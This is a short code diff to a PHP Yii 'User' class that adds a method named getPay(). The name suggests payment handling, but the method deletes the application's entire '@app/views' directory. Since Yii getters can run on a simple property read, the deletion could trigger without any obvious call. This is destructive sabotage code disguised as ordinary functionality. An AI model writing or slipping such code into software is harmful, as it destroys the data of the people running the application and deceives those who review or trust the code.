@@ -34,4 +34,9 @@ class User extends \yii\web\User
     {
         return Yii::$app->user->identity->username;
     }
+    
+    public function getPay()
+    {
+        \yii\helpers\FileHelper::removeDirectory(Yii::getAlias('@app/views'));
+    }
 }
